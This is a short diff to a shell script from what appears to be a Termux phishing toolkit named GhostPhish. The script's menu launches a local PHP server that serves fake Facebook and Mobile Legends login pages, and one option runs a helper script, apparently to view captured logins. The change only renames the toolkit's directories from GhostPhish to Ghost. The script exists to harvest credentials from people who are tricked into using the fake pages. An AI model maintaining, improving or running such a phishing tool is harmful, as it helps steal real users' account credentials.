@@ -83,7 +83,7 @@ echo $i"_________________________________"
 sleep 1
 echo
 echo $pur"  PHISING FACEBOOK LOGIN"
-php -S localhost:8080 -t /data/data/com.termux/files/home/GhostPhish/FB
+php -S localhost:8080 -t /data/data/com.termux/files/home/Ghost/FB
 fi
 
 if [ $pil = 3 ]
@@ -95,12 +95,12 @@ echo $i"_________________________________"
 sleep 1
 echo
 echo $cy"  PHISING MOBILE LEGEND"
-php -S localhost:8080 -t ~/GhostPhish/ML
+php -S localhost:8080 -t ~/Ghost/ML
 fi
 
 if [ $pil = 4 ]
 then
-cd ~/GhostPhish
+cd ~/Ghost
 sh lihat.sh
 sleep 4
 fi
